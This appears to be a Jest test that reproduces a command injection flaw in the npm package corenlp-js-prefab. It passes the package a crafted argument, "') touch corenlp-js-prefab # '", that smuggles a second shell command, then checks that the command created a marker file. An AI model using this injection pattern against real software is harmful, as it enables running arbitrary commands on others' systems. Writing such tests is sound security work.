test("Command Injection in corenlp-js-prefab", (done) => {
  expect.assertions(2);
  const a = require("corenlp-js-prefab");
  const fs = require("fs");
  const path = "./corenlp-js-prefab";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    a.process("') touch corenlp-js-prefab # '");
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {
    done();
  });
});
